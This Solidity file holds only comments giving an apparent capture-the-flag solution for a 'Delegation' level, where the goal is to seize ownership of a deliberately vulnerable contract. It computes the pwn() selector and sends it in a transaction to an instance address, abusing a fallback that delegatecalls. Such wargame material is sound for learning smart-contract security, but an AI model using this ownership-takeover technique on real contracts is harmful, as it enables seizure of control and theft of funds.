// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 6. DELEGATION
 * @dev Claim ownership of the contract to complete this level.
 */

/**
 * 1. Get the selector of the pwn() function:
 * const pwnSelector = web3.utils.keccak256("pwn()").slice(0, 10);
 *
 * 2. Send a transaction to the Delegation contract to trigger the fallback() function:
 * @param {string} from - Your wallet address.
 * @param {string} to - Delegation instance address.
 * @param {string} data - The selector of the pwn() function: "0xdd365b8b".
 * await web3.eth.sendTransaction({ from: "your wallet address", to: "0xb59aCD7131cE6c4CbAAF32e8A06Da14f65C09268", value: "0", data: "0xdd365b8b"});
 */
